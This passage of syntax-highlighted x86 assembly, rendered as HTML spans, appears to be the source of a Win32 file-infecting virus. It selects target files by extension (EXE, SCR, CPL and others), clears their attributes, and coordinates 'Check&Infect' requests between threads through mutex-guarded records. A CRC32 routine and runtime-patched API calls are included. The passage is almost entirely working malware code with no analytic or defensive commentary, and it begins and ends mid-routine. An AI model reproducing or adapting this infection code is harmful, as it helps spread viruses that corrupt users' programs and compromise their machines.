    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.WFD_dwFileAttributes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">c_error</span><span class="sc0">             </span><span class="sc1">;discard directory entries</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.WFD_nFileSizeHigh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;discard files &gt;4GB</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">c_error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">              </span><span class="sc1">;discard small files</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">c_error</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get filename</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">endf</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">             </span><span class="sc1">;search for dot</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">endf</span><span class="sc0">    
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;get filename extension</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">           </span><span class="sc1">;make it lowercase</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;mask it</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'exe.'</span><span class="sc0">         </span><span class="sc1">;is it EXE?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">extOK</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'rcs.'</span><span class="sc0">         </span><span class="sc1">;is it SCR?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">extOK</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'xfs.'</span><span class="sc0">         </span><span class="sc1">;is it SFX?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">extOK</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'lpc.'</span><span class="sc0">         </span><span class="sc1">;is it CPL?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">extOK</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'tad.'</span><span class="sc0">         </span><span class="sc1">;is it DAT?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">extOK</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'kab.'</span><span class="sc0">         </span><span class="sc1">;is it BAK?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">extOK</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">c_error</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">;save result</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">extOK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">      </span><span class="sc1">;normal file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddSetFileAttributesA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;blank file attributes</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">c_error</span><span class="sc0">


</span><span class="sc5">get_set_VLCB</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;get/set VLCB records procedure (IPC)</span><span class="sc0">
            </span><span class="sc1">;input: ECX   - 0=set/wait else wait/get</span><span class="sc0">
            </span><span class="sc1">;   ESI   - pointer to data, if ECX!=0</span><span class="sc0">
            </span><span class="sc1">;   EBX   - ID number of request</span><span class="sc0">
            </span><span class="sc1">;   EDX   - -1, if random thread, otherwise</span><span class="sc0">
            </span><span class="sc1">;         - number of thread.</span><span class="sc0">
            </span><span class="sc1">;output:ECX   - if input ECX!=0, ECX=ID</span><span class="sc0">
            </span><span class="sc1">;         - if error, ECX=-1</span><span class="sc0">
            </span><span class="sc1">;   EDX   - if ECX!=0, number of thread</span><span class="sc0">
            </span><span class="sc1">;   ESI   - ptr to data, if input ECX=0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vlcbBase</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">t_rnd</span><span class="sc0">                </span><span class="sc1">;get random record</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_TSize</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">sw_VLCB</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.VLCB_TSep.VLCB_THandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">qq</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_wait</span><span class="sc0">             </span><span class="sc1">;wait for free mutex</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.VLCB_TSep.VLCB_TData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VLCB_TSize</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">               </span><span class="sc1">;copy data</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.VLCB_TSep.VLCB_TID</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get ID</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r_mutex</span><span class="sc0">                </span><span class="sc1">;release mutex</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">t_next</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_TSize</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;move to next record</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">tsrch</span><span class="sc0">
</span><span class="sc5">qqq</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">qq</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">t_rnd</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;pass thru 20 records</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">tsrch</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.VLCB_TSep.VLCB_THandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">t_next</span><span class="sc0">               </span><span class="sc1">;check if its free</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">sw_VLCB</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_wait</span><span class="sc0">             </span><span class="sc1">;wait for free mutex</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.VLCB_TSep.VLCB_TData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VLCB_TSize</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">               </span><span class="sc1">;copy data</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.VLCB_TSep.VLCB_TID</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.VLCB_TSep.VLCB_TData.WFD_szAlternateFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;get result</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r_mutex</span><span class="sc0">                </span><span class="sc1">;signalize mutex</span><span class="sc0">
</span><span class="sc5">slp</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sleep</span><span class="sc0">              </span><span class="sc1">;switch to next thread</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">              </span><span class="sc1">;check for change</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">slp</span><span class="sc0">                  </span><span class="sc1">;no change, wait</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;quit</span><span class="sc0">
</span><span class="sc5">w_wait</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_mutex</span><span class="sc0">             </span><span class="sc1">;open mutex</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10000</span><span class="sc0">              </span><span class="sc1">;wait 10 seconds</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddWaitForSingleObject</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">qqq</span><span class="sc0">                 </span><span class="sc1">;quit if not signalized</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">close_mutex</span><span class="sc0">            </span><span class="sc1">;close mutex</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">open_mutex</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.VLCB_TSep.VLCB_THandle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;name of mutex</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0f0000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">100000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;access flags</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddOpenMutexA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">;open mutex</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">r_mutex</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_mutex</span><span class="sc0">             </span><span class="sc1">;open mutex</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddReleaseMutex</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;singalize mutex</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">close_mutex</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddCloseHandle</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;close mutex</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">sleep</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;switch to next thread</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddSleep</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;switch!</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Check</span><span class="sc4">&amp;</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;get ptr to data</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vlcb_stuph</span><span class="sc0">             </span><span class="sc1">;common stuph</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_Check</span><span class="sc0">         </span><span class="sc1">;check only</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_set_VLCB</span><span class="sc0">           </span><span class="sc1">;IPC!</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_ret_</span><span class="sc0">                </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.WFD_szAlternateFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_ret_</span><span class="sc0">
</span><span class="sc5">sc1_ok</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vlcb_stuph</span><span class="sc0">             </span><span class="sc1">;common stuph</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_Infect</span><span class="sc0">            </span><span class="sc1">;check and infect</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_set_VLCB</span><span class="sc0">           </span><span class="sc1">;IPC!</span><span class="sc0">
</span><span class="sc5">_ret_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CRC32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;procedure to calculate CRC32</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">       
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   
</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">           
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">   
        </span><span class="sc6">lodsb</span><span class="sc0">          
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">     
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NoCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0edb8h</span><span class="sc0">
</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextBitCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextByteCRC</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
